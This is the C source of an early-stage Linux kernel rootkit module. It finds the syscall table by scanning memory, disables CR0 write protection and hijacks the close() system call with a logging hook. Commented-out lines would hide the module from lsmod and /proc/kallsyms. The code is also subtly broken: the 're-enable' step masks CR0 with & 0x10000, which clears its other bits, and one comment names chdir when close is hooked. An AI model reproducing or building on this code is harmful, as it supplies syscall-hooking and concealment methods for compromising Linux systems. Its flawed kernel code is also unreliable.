#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <asm/unistd.h>

//#if defined(__686__)
#define SYSCALL_TABLE_START ((unsigned long) 0xc0000000)
#define SYSCALL_TABLE_STOP ((unsigned long) 0xd0000000)
typedef unsigned int pointer_size_t;
unsigned int **syscall_table;
//#else
//#define SYSCALL_TABLE_START ((unsigned long) 0xffffffff81000000l)
//#define SYSCALL_TABLE_STOP ((unsigned long) 0xffffffffa2000000l)
//typedef unsigned long pointer_size_t;
//unsigned long **syscall_table;
//#endif

asmlinkage int (*original_close)(int fd);

asmlinkage int my_close(int fd)
{
    int err;
    printk("RKIT: Hijacked close call; fd: %d\n", fd);
    err = original_close(fd);
    return err;
}

pointer_size_t **find_syscall_table(void)
{
    pointer_size_t i;
    pointer_size_t **table;
    for (i = SYSCALL_TABLE_START; i < SYSCALL_TABLE_STOP; i += sizeof(void *)) {
        table = (pointer_size_t **) i;
        if ( table[__NR_close] == (pointer_size_t *) sys_close)
            return &table[0];
    }
    return NULL;
}

int rootkit_init(void)
{
    printk("RKIT: Loading rootkit...\n");

    /* Uncomment the following lines after completion of module
     * Can't rmmod it if we have it uncommented during dev
     * That's just cumbersome during dev
     */
    /*
    // stop from showing on lsmod
    list_del_init(&__this_module.list);

    // stop showing in /proc/kallsyms
    kobject_del(&THIS_MODULE->mkobj.kobj);
    */

    syscall_table = find_syscall_table();
    if (!syscall_table) {
        printk("RKIT: Couldn't find syscall table\n");
        goto out;
    }

    printk("RKIT: Syscall table at %p\n", syscall_table);
    printk("RKIT: Disabling write protection\n");
    // make writable by disabling write protect
    write_cr0(read_cr0() & (~0x10000));

    // hijack chdir system call
    original_close = (asmlinkage int (*)(int)) syscall_table[__NR_close];
    syscall_table[__NR_close] = (void *) my_close;
    printk("RKIT: Calls hijacked\n");

    // enable write protected
    printk("RKIT: Re-enabling write protection\n");
    write_cr0(read_cr0() & 0x10000);

out:
    return 0;
}

void rootkit_exit(void)
{
    // Disable write protection on page
    if (syscall_table == NULL) {
        printk("RKIT: Nothing to unload\n");
        goto out;
    }
    write_cr0(read_cr0() & (~0x10000));
    syscall_table[__NR_close] = (void *) original_close;
    // Enable write protection on page
    write_cr0(read_cr0() & 0x10000);
out:
    printk("RKIT: Rootkit unloaded\n");
    return;
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("BufferOverflowers");
module_init(rootkit_init);
module_exit(rootkit_exit);
